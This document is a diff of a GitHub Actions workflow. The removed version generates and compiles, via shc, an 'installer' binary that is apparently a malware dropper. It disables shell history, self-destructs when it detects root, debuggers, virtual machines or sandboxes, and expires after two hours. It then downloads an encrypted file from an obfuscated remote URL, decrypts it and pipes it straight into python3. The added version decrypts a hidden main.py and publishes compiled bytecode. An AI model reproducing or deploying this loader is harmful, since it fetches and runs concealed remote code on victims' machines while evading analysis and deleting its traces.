@@ -1,118 +1,79 @@
-name: Automated Secure Binary Compiler
+name: Decrypt and compile Python bytecode
 
 on:
   push:
+    branches:
+      - main
     paths:
-      - 'payload.enc'
+      - main.py
+      - .github/workflows/compiler.yml
   workflow_dispatch:
 
+permissions:
+  contents: write
+
+concurrency:
+  group: python-compiler-${{ github.ref }}
+  cancel-in-progress: false
+
 jobs:
-  build-and-deploy:
+  compile:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout Code Repository
+      - name: Check out destination repository
         uses: actions/checkout@v4
 
-      - name: Install Shell Script Compiler (SHC)
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+
+      - name: Decrypt and compile main.py
+        shell: bash
+        env:
+          AES_KEY: ${{ secrets.DECRYPT_KEY }}
         run: |
-          sudo apt-get update
-          sudo apt-get install -y shc
+          set -euo pipefail
 
-      - name: Construct Fortified Installer Payload
+          if [[ -z "${AES_KEY:-}" ]]; then
+            echo "::error::Missing Actions secret DECRYPT_KEY"
+            exit 1
+          fi
+
+          if [[ ! -s main.py ]]; then
+            echo "::error::Encrypted main.py is missing or empty"
+            exit 1
+          fi
+
+          DECRYPTED_SOURCE="$(mktemp "$RUNNER_TEMP/decrypted_main.XXXXXX.py")"
+          trap 'rm -f "$DECRYPTED_SOURCE"' EXIT
+
+          openssl enc -d -aes-256-cbc -salt -pbkdf2 -iter 100000 -a \
+            -in main.py \
+            -out "$DECRYPTED_SOURCE" \
+            -pass env:AES_KEY
+
+          if [[ ! -s "$DECRYPTED_SOURCE" ]]; then
+            echo "::error::Decryption produced an empty file"
+            exit 1
+          fi
+
+          python -c 'import py_compile, sys; py_compile.compile(sys.argv[1], cfile="main.pyc", dfile="main.py", doraise=True)' "$DECRYPTED_SOURCE"
+          test -s main.pyc
+          echo "Successfully compiled main.pyc"
+
+      - name: Publish main.pyc
+        shell: bash
         run: |
-          # 1. Capture system timestamp variables cleanly
-          DYNAMICS_TIMESTAMP=$(date +%s)
-          
-          # 2. Assign configuration target paths explicitly
-          TARGET_URL="https://raw.githubusercontent.com/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4P/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvck/refs/heads/main/main.py"
-          REAL_AES_KEY="${{ secrets.DECRYPT_KEY }}"
+          set -euo pipefail
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git add -f main.pyc
 
-          # 3. Write template data utilizing safe single-line processing to prevent backslash breakage
-          cat << EOF > payload_source.sh
-          #!/bin/bash
-
-          set +o history 2>/dev/null
-          export HISTCONTROL=ignoreboth 2>/dev/null
-          export HISTSIZE=0 2>/dev/null
-
-          self_destruct() {
-              DECRYPT_KEY="0000000000000000000000000000000000000000000000000000000000000000"
-              A7="0000000000000000000000000000000000000000000000000000000000000000"
-              export DECRYPT_KEY="0"
-              unset DECRYPT_KEY A7 HISTFILE
-
-              if [ -n "\$0" ] && [ -f "\$0" ]; then
-                  local size
-                  size=\$(wc -c < "\$0" 2>/dev/null || echo 10240)
-                  dd if=/dev/urandom of="\$0" bs="\$size" count=1 conv=notrunc 2>/dev/null
-                  dd if=/dev/zero of="\$0" bs="\$size" count=1 conv=notrunc 2>/dev/null
-                  rm -f "\$0" 2>/dev/null
-              fi
-
-              clear 2>/dev/null
-              printf "\033c" 2>/dev/null 
-              history -c 2>/dev/null
-              exit 0
-          }
-
-          trap 'self_destruct' ERR EXIT SIGINT SIGTERM SIGQUIT SIGHUP
-
-          if [ "\$EUID" -eq 0 ] || [ "\$UID" -eq 0 ] || [ \$(id -u 2>/dev/null) -eq 0 ]; then
-              self_destruct
+          if git diff --cached --quiet; then
+            echo 'main.pyc is unchanged; nothing to commit.'
+            exit 0
           fi
 
-          if id | grep -E -q '(sudo|wheel|admin|root|shadow)' 2>/dev/null; then
-              self_destruct
-          fi
-
-          if [ -f /proc/self/status ]; then
-              if grep -q "TracerPid:[[:space:]]*[1-9]" /proc/self/status 2>/dev/null; then
-                  self_destruct
-              fi
-              if grep -q "wchan:[[:space:]]*ptrace_stop" /proc/self/wchan 2>/dev/null; then
-                  self_destruct
-              fi
-          fi
-
-          if [ -d /proc ]; then
-              if grep -E -iq "VirtualBox|VMware|KVM|QEMU|Xen|Hyper-V|sandbox|cuckoo|docker|lxc" /proc/cpuinfo /proc/scsi/scsi /proc/version 2>/dev/null; then
-                  self_destruct
-              fi
-          fi
-
-          if [ -z "\$DISPLAY" ] && [ -z "\$WAYLAND_DISPLAY" ]; then
-              self_destruct
-          fi
-
-          COMPILE_TIME=${DYNAMICS_TIMESTAMP}
-          CURRENT_EPOCH=\$(date +%s 2>/dev/null || echo 0)
-          LIFESPAN=7200
-
-          if [ "\$CURRENT_EPOCH" -eq 0 ] || [ "\$CURRENT_EPOCH" -gt \$((\$COMPILE_TIME + \$LIFESPAN)) ] || [ "\$CURRENT_EPOCH" -lt "$COMPILE_TIME" ]; then
-              self_destruct
-          fi
-
-          export DECRYPT_KEY="${REAL_AES_KEY}"
-          A7="${TARGET_URL}" 
-
-          # Continuous single-line pipeline structure eliminates backslash formatting vulnerabilities entirely
-          curl -sSsfL --tlsv1.3 --tls-max 1.3 -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" --retry 2 --connect-timeout 8 "\$A7" 2>/dev/null | openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -k "\$DECRYPT_KEY" 2>/dev/null | python3 - 2>/dev/null || self_destruct
-
-          trap - ERR EXIT SIGINT SIGTERM SIGQUIT SIGHUP
-          unset DECRYPT_KEY A7
-          set -o history 2>/dev/null
-          EOF
-
-      - name: Compile Script into Binary ELF Format
-        run: |
-          shc -v -r -B -f payload_source.sh -o installer
-
-      - name: Deploy Compiled Executable to Repository Live Folder
-        run: |
-          mkdir -p dist
-          mv installer dist/
-          git config --global user.name "github-actions[bot]"
-          git config --global user.email "github-actions[bot]@://github.com"
-          git add dist/installer
-          git commit -m "Automated Sync: Hardened Binary Rotation" || echo "No changes to sync"
-          git push
+          git commit -m 'Build main.pyc from encrypted main.py'
+          git push origin "HEAD:${GITHUB_REF_NAME}"
